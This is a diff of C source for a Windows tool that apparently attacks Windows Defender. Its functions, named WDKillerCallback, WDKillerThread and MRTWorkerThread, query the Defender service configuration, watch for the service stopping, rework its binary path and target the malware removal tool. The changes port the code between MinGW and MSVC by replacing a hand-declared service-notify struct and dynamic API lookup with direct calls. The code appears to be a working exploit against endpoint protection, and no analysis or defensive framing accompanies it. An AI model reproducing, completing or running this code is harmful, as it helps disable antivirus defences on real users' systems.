@@ -1,32 +1,11 @@
 #define _CRT_SECURE_NO_WARNINGS
-#define _UNICODE
-#define UNICODE
-#define WINVER 0x0A00
-#define _WIN32_WINNT 0x0A00
-#include <windows.h>
+#include <Windows.h>
 #include <stdio.h>
 #include <winternl.h>
 #include <ntstatus.h>
 #include <conio.h>
 #include <objbase.h>
 #pragma comment(lib,"ntdll.lib")
-
-// MinGW missing type
-typedef VOID (CALLBACK *PFN_SC_NOTIFY_CALLBACKW)(PVOID);
-
-typedef struct _SERVICE_NOTIFY_2W {
-    DWORD dwVersion;
-    PFN_SC_NOTIFY_CALLBACKW pfnNotifyCallback;
-    PVOID pContext;
-    DWORD dwNotificationStatus;
-    SERVICE_STATUS_PROCESS ServiceStatus;
-    DWORD dwNotificationTriggered;
-    LPWSTR pszServiceNames;
-} SERVICE_NOTIFY_2W, *PSERVICE_NOTIFY_2W;
-
-typedef DWORD (WINAPI *pNotifyServiceStatusChangeW)(SC_HANDLE, DWORD, PSERVICE_NOTIFY_2W);
-#define SERVICE_NOTIFY_STATUS_CHANGE 2
-#define SERVICE_NOTIFY_STOPPED 0x00000001
 
 HANDLE* gHandleTracker = NULL;
 CRITICAL_SECTION* gHandleTrackerLock;
@@ -190,9 +169,8 @@ VOID WDKillerCallback(IN PVOID pParameter)
 		printf("Failed to query windows defender service configuration, error : %d\n", GetLastError());
 		return;
 	}
-	WCHAR* bpath = (WCHAR*)svccfg->lpBinaryPathName;
-	bpath[wcslen(bpath) - 1] = NULL;
-	WCHAR* binpath = &bpath[1];
+	svccfg->lpBinaryPathName[wcslen(svccfg->lpBinaryPathName) - 1] = NULL;
+	wchar_t* binpath = &svccfg->lpBinaryPathName[1];
 	/*
 	wchar_t dllpath[MAX_PATH] = { 0 };
 	memmove(dllpath, binpath, wcslen(binpath) * sizeof(wchar_t) - (11 * sizeof(wchar_t)));
@@ -274,20 +252,12 @@ DWORD WINAPI WDKillerThread(void*)
 		CloseHandle(hsvc);
 		ExitProcess(ERROR_SUCCESS);
 	}
-	HMODULE hSvcDll = LoadLibraryW(L"sechost.dll");
-	if (!hSvcDll) hSvcDll = LoadLibraryW(L"advapi32.dll");
-	pNotifyServiceStatusChangeW pNotify = (pNotifyServiceStatusChangeW)GetProcAddress(hSvcDll, "NotifyServiceStatusChangeW");
-	if (!pNotify) {
-		printf("Failed to resolve NotifyServiceStatusChangeW\n");
-		CloseHandle(hsvc);
-		return 1;
-	}
 	while (1) {
 		SERVICE_NOTIFY_2W svcnotify = { 0 };
 		svcnotify.dwVersion = SERVICE_NOTIFY_STATUS_CHANGE;
 		svcnotify.pfnNotifyCallback = WDKillerCallback;
 		svcnotify.pContext = hsvc;
-		if (pNotify(hsvc,
+		if (NotifyServiceStatusChangeW(hsvc,
 			SERVICE_NOTIFY_STOPPED, &svcnotify))
 		{
 			printf("Failed to set a notification for windows defender status.\n");
@@ -358,7 +328,7 @@ DWORD WINAPI MRTWorkerThread(void*) {
 	return ERROR_SUCCESS;
 }
 
-int main()
+int wmain()
 {
 	DWORD tid2 = 0;
 
